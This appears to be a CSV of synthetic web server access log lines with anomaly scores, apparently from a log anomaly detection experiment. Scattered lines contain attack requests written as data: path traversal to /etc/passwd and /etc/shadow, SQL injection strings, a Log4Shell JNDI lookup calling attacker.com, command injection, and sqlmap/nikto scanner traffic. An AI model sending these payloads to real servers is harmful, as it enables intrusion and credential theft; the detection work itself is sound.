score_content,score_session,score_fused,line
1.5873154401779175,0.7420346140861511,1.1646750271320343,58.217.28.90 - - [10/Jan/2025:12:00:36 +0000] "GET /api/products HTTP/1.1" 200 15900 "https://example.com/" "python-requests/2.31.0"
7.951960563659668,985.939208984375,496.94558477401733,250.197.210.160 - - [10/Jan/2025:12:00:36 +0000] "GET /api/product?id=123 HTTP/1.1" 304 18481 "https://twitter.com/" "python-requests/2.31.0"
1.699571132659912,0.373821884393692,1.036696508526802,180.196.80.236 - - [10/Jan/2025:12:00:36 +0000] "GET /login HTTP/1.1" 200 9054 "https://example.com/" "curl/7.68.0"
0.25534045696258545,0.6349466443061829,0.44514355063438416,18.37.190.163 - - [10/Jan/2025:12:00:36 +0000] "GET /assets/app.css HTTP/1.1" 200 13232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.839580059051514,1.0389297008514404,3.439254879951477,41.95.80.185 - - [10/Jan/2025:12:00:41 +0000] "GET /search?q=laptop HTTP/1.1" 200 11270 "https://twitter.com/" "curl/7.68.0"
0.2660108506679535,0.2178165763616562,0.24191371351480484,173.21.70.114 - - [10/Jan/2025:12:00:45 +0000] "GET /wp-login.php HTTP/1.1" 200 1730 "https://news.ycombinator.com/" "dirb/2.22"
1.7234835624694824,0.7616910934448242,1.2425873279571533,30.89.111.29 - - [10/Jan/2025:12:00:49 +0000] "GET /login HTTP/1.1" 200 16888 "https://twitter.com/" "curl/7.68.0"
1.6798553466796875,0.5696548223495483,1.124755084514618,253.154.15.2 - - [10/Jan/2025:12:00:52 +0000] "GET /logout HTTP/1.1" 200 13051 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.6816978454589844,0.18140055239200592,0.9315491989254951,2.128.192.111 - - [10/Jan/2025:12:00:53 +0000] "GET /login HTTP/1.1" 200 4031 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.854754447937012,1.3941928148269653,3.6244736313819885,19.102.221.190 - - [10/Jan/2025:12:00:56 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11705 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.704662322998047,3678.279052734375,1845.4918575286865,110.147.104.182 - - [10/Jan/2025:12:00:56 +0000] "GET /about HTTP/1.1" 401 1179 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
569.491455078125,8179.994140625,4374.7427978515625,206.243.159.118 - - [10/Jan/2025:12:00:58 +0000] "GET /admin HTTP/1.1" 500 351 "-" "sqlmap/1.5.10#stable"
5.8594255447387695,1.4295035600662231,3.6444645524024963,135.21.102.223 - - [10/Jan/2025:12:01:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 13221 "https://example.com/" "curl/7.68.0"
0.24509009718894958,0.18458206951618195,0.21483608335256577,136.131.50.232 - - [10/Jan/2025:12:01:02 +0000] "GET /assets/app.js HTTP/1.1" 200 3836 "https://example.com/" "curl/7.68.0"
0.22698625922203064,0.24322539567947388,0.23510582745075226,66.51.45.155 - - [10/Jan/2025:12:01:07 +0000] "GET /assets/app.css HTTP/1.1" 200 4898 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.793262958526611,1.6192586421966553,3.7062608003616333,195.149.115.175 - - [10/Jan/2025:12:01:08 +0000] "GET /search?q=headphones HTTP/1.1" 200 18572 "https://twitter.com/" "python-requests/2.31.0"
1.555629849433899,0.11402592062950134,0.8348278850317001,121.114.162.78 - - [10/Jan/2025:12:01:10 +0000] "GET /dashboard HTTP/1.1" 200 2337 "https://twitter.com/" "curl/7.68.0"
1.7179934978485107,0.6799896955490112,1.198991596698761,10.15.95.213 - - [10/Jan/2025:12:01:10 +0000] "GET /about HTTP/1.1" 200 14908 "-" "curl/7.68.0"
1.7205383777618408,0.8373024463653564,1.2789204120635986,99.119.149.142 - - [10/Jan/2025:12:01:15 +0000] "GET /about HTTP/1.1" 201 16715 "-" "sqlmap/1.5.10#stable"
1.5867172479629517,0.694969892501831,1.1408435702323914,129.39.246.16 - - [10/Jan/2025:12:01:18 +0000] "GET /api/products HTTP/1.1" 200 15685 "-" "Wget/1.20.3 (linux-gnu)"
1.6877250671386719,0.23497211933135986,0.9613485932350159,11.64.182.113 - - [10/Jan/2025:12:01:20 +0000] "GET /about HTTP/1.1" 200 5754 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.6366848945617676,0.34199896454811096,0.9893419295549393,100.105.199.87 - - [10/Jan/2025:12:01:24 +0000] "GET /profile HTTP/1.1" 200 9369 "https://twitter.com/" "sqlmap/1.5.10#stable"
1.5569000244140625,0.10214920341968536,0.8295246139168739,143.174.99.73 - - [10/Jan/2025:12:01:24 +0000] "GET /dashboard HTTP/1.1" 200 3196 "https://twitter.com/" "curl/7.68.0"
11.333840370178223,3788.3955078125,1899.864674091339,248.168.179.170 - - [10/Jan/2025:12:01:25 +0000] "GET /assets/app.css HTTP/1.1" 404 635 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.7106643915176392,0.5455211400985718,1.1280927658081055,165.203.85.209 - - [10/Jan/2025:12:01:29 +0000] "GET /about HTTP/1.1" 200 12443 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.8473310470581055,1.1886508464813232,3.5179909467697144,93.80.47.244 - - [10/Jan/2025:12:01:29 +0000] "GET /search?q=phone HTTP/1.1" 200 697 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24438029527664185,0.4854393005371094,0.3649097979068756,217.202.26.130 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 9792 "https://twitter.com/" "python-requests/2.31.0"
0.2278938740491867,0.26922357082366943,0.24855872243642807,42.47.213.178 - - [10/Jan/2025:12:01:32 +0000] "GET /assets/app.css HTTP/1.1" 200 5154 "https://www.google.com/" "python-requests/2.31.0"
5.8483686447143555,0.8882742524147034,3.3683214485645294,249.114.157.73 - - [10/Jan/2025:12:01:37 +0000] "GET /search?q=phone HTTP/1.1" 200 7883 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
569.42626953125,8182.9755859375,4376.200927734375,232.214.50.95 - - [10/Jan/2025:12:01:38 +0000] "GET /logout HTTP/1.1" 500 960 "https://twitter.com/" "sqlmap/1.5.10#stable"
3.766860246658325,985.0780029296875,494.4224315881729,136.108.248.42 - - [10/Jan/2025:12:01:41 +0000] "GET /logout HTTP/1.1" 304 16579 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3447318375110626,0.6272076964378357,0.48596976697444916,142.240.27.183 - - [10/Jan/2025:12:01:42 +0000] "GET /index.html HTTP/1.1" 201 12263 "-" "python-requests/2.31.0"
0.14235509932041168,1.3368923664093018,0.7396237328648567,38.213.112.24 - - [10/Jan/2025:12:01:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 16921 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
5.8753767013549805,1.244140863418579,3.55975878238678,96.61.99.21 - - [10/Jan/2025:12:01:46 +0000] "GET /search?q=phone HTTP/1.1" 200 16549 "https://www.google.com/" "curl/7.68.0"
12.614703178405762,3639.2275390625,1825.9211211204529,86.203.38.36 - - [10/Jan/2025:12:01:46 +0000] "GET /contact HTTP/1.1" 400 1331 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.317263126373291,949.13818359375,475.72772336006165,115.158.2.232 - - [10/Jan/2025:12:01:49 +0000] "GET /assets/app.css HTTP/1.1" 302 15471 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2670823633670807,0.797857403755188,0.5324698835611343,109.29.199.74 - - [10/Jan/2025:12:01:51 +0000] "GET /assets/app.css HTTP/1.1" 200 17394 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.493222713470459,0.7695520520210266,1.1313873827457428,17.29.215.232 - - [10/Jan/2025:12:01:51 +0000] "GET /server-status HTTP/1.1" 201 15078 "https://twitter.com/" "nikto/2.5.0"
7.769523620605469,949.43310546875,478.60131454467773,110.1.158.91 - - [10/Jan/2025:12:01:55 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 9644 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.7090195417404175,0.5253740549087524,1.117196798324585,18.245.135.140 - - [10/Jan/2025:12:01:58 +0000] "GET /about HTTP/1.1" 200 11916 "https://twitter.com/" "python-requests/2.31.0"
5.976120471954346,7.319574356079102,6.647847414016724,252.96.65.192 - - [10/Jan/2025:12:02:02 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 12777 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.7190680503845215,985.1710815429688,494.44507479667664,35.12.91.140 - - [10/Jan/2025:12:02:02 +0000] "GET /contact HTTP/1.1" 304 10995 "https://www.google.com/" "curl/7.68.0"
5.746409893035889,1.1073849201202393,3.426897406578064,17.184.199.242 - - [10/Jan/2025:12:02:07 +0000] "GET /search?q=headphones HTTP/1.1" 201 4518 "-" "Wget/1.20.3 (linux-gnu)"
12.633340835571289,3744.8330078125,1878.7331743240356,239.80.132.102 - - [10/Jan/2025:12:02:09 +0000] "GET /api/products HTTP/1.1" 403 646 "https://news.ycombinator.com/" "python-requests/2.31.0"
5.676673412322998,1.962494969367981,3.8195841908454895,222.168.85.70 - - [10/Jan/2025:12:02:11 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 1666 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
16.891735076904297,3753.168212890625,1885.0299739837646,87.250.48.128 - - [10/Jan/2025:12:02:14 +0000] "GET /search?q=camera HTTP/1.1" 403 791 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
3.792263984680176,983.0523681640625,493.42231607437134,21.111.155.211 - - [10/Jan/2025:12:02:16 +0000] "GET /login HTTP/1.1" 304 14010 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.7020752429962158,0.42123737931251526,1.0616563111543655,79.115.155.184 - - [10/Jan/2025:12:02:18 +0000] "GET /about HTTP/1.1" 200 9787 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
5.840795516967773,1.09080171585083,3.4657986164093018,158.112.71.164 - - [10/Jan/2025:12:02:23 +0000] "GET /search?q=camera HTTP/1.1" 200 11652 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.6222611665725708,0.1828605681657791,0.902560867369175,244.8.37.218 - - [10/Jan/2025:12:02:28 +0000] "GET /profile HTTP/1.1" 200 5342 "https://news.ycombinator.com/" "python-requests/2.31.0"
7.800037860870361,985.9315185546875,496.86577820777893,93.99.244.146 - - [10/Jan/2025:12:02:28 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 304 12103 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.614284634590149,0.135300412774086,0.8747925236821175,147.36.136.94 - - [10/Jan/2025:12:02:29 +0000] "GET /profile HTTP/1.1" 200 2619 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.6253718137741089,0.21651621162891388,0.9209440127015114,128.133.100.234 - - [10/Jan/2025:12:02:34 +0000] "GET /contact HTTP/1.1" 200 6196 "-" "python-requests/2.31.0"
5.833596706390381,0.9960411190986633,3.414818912744522,178.235.126.52 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 200 9457 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
573.6903076171875,8349.4990234375,4461.594665527344,248.217.253.82 - - [10/Jan/2025:12:02:36 +0000] "GET /search?q=camera HTTP/1.1" 503 1396 "https://example.com/" "sqlmap/1.5.10#stable"
16.936443328857422,3750.880615234375,1883.9085292816162,183.182.238.180 - - [10/Jan/2025:12:02:41 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 403 322 "https://example.com/" "curl/7.68.0"
3.6390340328216553,984.0108642578125,493.8249491453171,203.127.7.93 - - [10/Jan/2025:12:02:45 +0000] "GET /api/products HTTP/1.1" 304 7857 "https://twitter.com/" "python-requests/2.31.0"
0.22112101316452026,0.16547401249408722,0.19329751282930374,17.80.102.184 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 2925 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
16.910032272338867,3638.489501953125,1827.699767112732,33.249.82.165 - - [10/Jan/2025:12:02:51 +0000] "GET /search?q=phone HTTP/1.1" 400 151 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.662893295288086,0.7617565989494324,1.2123249471187592,164.151.47.197 - - [10/Jan/2025:12:02:54 +0000] "GET /profile HTTP/1.1" 200 18165 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.318439483642578,3637.176025390625,1824.2472324371338,40.78.43.42 - - [10/Jan/2025:12:02:58 +0000] "GET /index.html HTTP/1.1" 400 1061 "https://www.google.com/" "curl/7.68.0"
12.668198585510254,3640.925048828125,1826.7966237068176,51.163.245.142 - - [10/Jan/2025:12:03:00 +0000] "GET /logout HTTP/1.1" 400 513 "https://www.google.com/" "curl/7.68.0"
1.6872553825378418,0.23933099210262299,0.9632931873202324,152.242.149.40 - - [10/Jan/2025:12:03:05 +0000] "GET /about HTTP/1.1" 200 5625 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.558282852172852,3639.303955078125,1825.931118965149,11.212.222.8 - - [10/Jan/2025:12:03:10 +0000] "GET /dashboard HTTP/1.1" 400 1154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.719497561454773,2.296903610229492,2.0082005858421326,107.159.164.8 - - [10/Jan/2025:12:03:15 +0000] "GET /login HTTP/1.1" 204 18847 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.6809260845184326,0.5752006769180298,1.1280633807182312,77.117.19.177 - - [10/Jan/2025:12:03:17 +0000] "GET /logout HTTP/1.1" 200 13406 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.863983631134033,1.459748387336731,3.661866009235382,37.81.221.184 - - [10/Jan/2025:12:03:20 +0000] "GET /search?q=camera HTTP/1.1" 200 19979 "https://example.com/" "curl/7.68.0"
5.74296760559082,2.5418541431427,4.14241087436676,82.62.120.32 - - [10/Jan/2025:12:03:23 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3579 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.29833707213401794,0.5761452317237854,0.4372411519289017,222.158.108.64 - - [10/Jan/2025:12:03:24 +0000] "GET /wp-login.php HTTP/1.1" 200 12687 "https://example.com/" "curl/7.68.0"
3.6433098316192627,947.3771362304688,475.510223031044,132.120.128.226 - - [10/Jan/2025:12:03:28 +0000] "GET /api/products HTTP/1.1" 302 16427 "https://news.ycombinator.com/" "curl/7.68.0"
0.5165295600891113,0.4325653314590454,0.47454744577407837,56.150.91.13 - - [10/Jan/2025:12:03:28 +0000] "GET /.env HTTP/1.1" 200 7988 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.781922340393066,1.9306519031524658,3.856287121772766,217.28.111.35 - - [10/Jan/2025:12:03:31 +0000] "GET /search?q=headphones HTTP/1.1" 200 367 "https://example.com/" "curl/7.68.0"
5.860295295715332,1.3738436698913574,3.6170694828033447,50.93.142.74 - - [10/Jan/2025:12:03:34 +0000] "GET /search?q=laptop HTTP/1.1" 200 18509 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.679198265075684,3640.48828125,1826.5837397575378,175.157.31.33 - - [10/Jan/2025:12:03:38 +0000] "GET /login HTTP/1.1" 400 1276 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.5871131420135498,0.448453813791275,1.0177834779024124,194.37.51.155 - - [10/Jan/2025:12:03:40 +0000] "GET /dashboard HTTP/1.1" 200 12080 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.2930646538734436,0.4632146954536438,0.3781396746635437,206.122.133.117 - - [10/Jan/2025:12:03:44 +0000] "GET /wp-login.php HTTP/1.1" 200 11013 "https://twitter.com/" "curl/7.68.0"
5.816268444061279,4.24605131149292,5.0311598777771,152.87.130.213 - - [10/Jan/2025:12:03:48 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9905 "https://twitter.com/" "nikto/2.5.0"
1.8646620512008667,0.4629385471343994,1.163800299167633,251.107.150.79 - - [10/Jan/2025:12:03:50 +0000] "GET / HTTP/1.1" 200 3691 "-" "sqlmap/1.5.10#stable"
7.931307792663574,949.4256591796875,478.67848348617554,123.44.135.162 - - [10/Jan/2025:12:03:54 +0000] "GET /api/product?id=123 HTTP/1.1" 302 19220 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.693298816680908,1.4659143686294556,3.579606592655182,49.5.113.81 - - [10/Jan/2025:12:03:57 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3701 "https://www.google.com/" "dirb/2.22"
5.872636318206787,1.2605769634246826,3.566606640815735,224.218.189.187 - - [10/Jan/2025:12:04:00 +0000] "GET /search?q=phone HTTP/1.1" 200 15553 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
569.44921875,8353.0888671875,4461.26904296875,135.97.81.245 - - [10/Jan/2025:12:04:04 +0000] "GET /dashboard HTTP/1.1" 503 979 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.677988290786743,928.8755493164062,466.2767688035965,157.124.50.246 - - [10/Jan/2025:12:04:08 +0000] "GET /profile HTTP/1.1" 301 8762 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.736198663711548,984.9752807617188,494.35573971271515,177.181.126.82 - - [10/Jan/2025:12:04:12 +0000] "GET /logout HTTP/1.1" 304 6892 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
1.7287192344665527,0.8163593411445618,1.2725392878055573,174.140.98.230 - - [10/Jan/2025:12:04:16 +0000] "GET /login HTTP/1.1" 200 18891 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
13.482732772827148,4773.01953125,2393.2511320114136,89.237.114.168 - - [10/Jan/2025:12:04:17 +0000] "GET /logout HTTP/1.1" 429 161 "https://news.ycombinator.com/" "curl/7.68.0"
12.775973320007324,3786.241943359375,1899.5089583396912,70.36.28.158 - - [10/Jan/2025:12:04:18 +0000] "GET /login HTTP/1.1" 404 1425 "https://twitter.com/" "sqlmap/1.5.10#stable"
5.822844982147217,1.1806071996688843,3.5017260909080505,26.106.85.184 - - [10/Jan/2025:12:04:19 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1820 "-" "Wget/1.20.3 (linux-gnu)"
569.6798706054688,8183.4931640625,4376.586517333984,105.168.240.226 - - [10/Jan/2025:12:04:24 +0000] "GET / HTTP/1.1" 500 323 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.6455169916152954,0.18501336872577667,0.915265180170536,233.197.23.167 - - [10/Jan/2025:12:04:29 +0000] "GET /logout HTTP/1.1" 200 2038 "https://www.google.com/" "python-requests/2.31.0"
11.4491605758667,3787.061279296875,1899.2552199363708,107.226.215.46 - - [10/Jan/2025:12:04:33 +0000] "GET /index.html HTTP/1.1" 404 358 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.977834701538086,3752.973876953125,1882.9758558273315,77.146.155.28 - - [10/Jan/2025:12:04:36 +0000] "GET /logout HTTP/1.1" 403 18 "https://example.com/" "curl/7.68.0"
16.863136291503906,3746.68798828125,1881.775562286377,218.130.120.70 - - [10/Jan/2025:12:04:39 +0000] "GET /search?q=headphones HTTP/1.1" 403 274 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
5.812986373901367,2.322312116622925,4.067649245262146,4.189.87.203 - - [10/Jan/2025:12:04:41 +0000] "GET /search?q=camera HTTP/1.1" 204 6201 "https://twitter.com/" "curl/7.68.0"
0.27744242548942566,0.5986118912696838,0.43802715837955475,212.110.132.84 - - [10/Jan/2025:12:04:46 +0000] "GET /assets/app.js HTTP/1.1" 200 13387 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.19984613358974457,0.4582173824310303,0.3290317580103874,2.67.99.61 - - [10/Jan/2025:12:04:51 +0000] "GET /../../etc/passwd HTTP/1.1" 200 8228 "https://example.com/" "nikto/2.5.0"
1.8929110765457153,0.8108491897583008,1.351880133152008,178.61.16.171 - - [10/Jan/2025:12:04:53 +0000] "GET / HTTP/1.1" 200 11881 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.7126893997192383,929.7091674804688,466.710928440094,95.158.57.57 - - [10/Jan/2025:12:04:55 +0000] "GET /logout HTTP/1.1" 301 9767 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
